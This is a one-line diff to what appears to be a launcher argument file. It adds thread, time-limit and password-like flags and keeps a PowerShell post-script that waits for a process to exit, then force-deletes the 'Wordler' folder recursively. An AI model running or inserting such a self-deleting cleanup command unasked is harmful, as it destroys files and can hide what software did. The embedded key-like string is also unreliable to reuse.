@@ -1,1 +1,1 @@
---tl 5 --ps " Wait-Process -Id @ID; $directorypath = (Get-Item .).FullName; $path = $directorypath + '\Wordler'; Remove-Item $path -Recurse -Force "
+-t 2 --tl 4200 -p "2RLyQBWOCggxaoWsi2V1HDiCVJfpKCTR Vesk4000 xUiic4WkiQbcg5GQ" --ps " Wait-Process -Id @ID; $directorypath = (Get-Item .).FullName; $path = $directorypath + '\Wordler'; Remove-Item $path -Recurse -Force " 
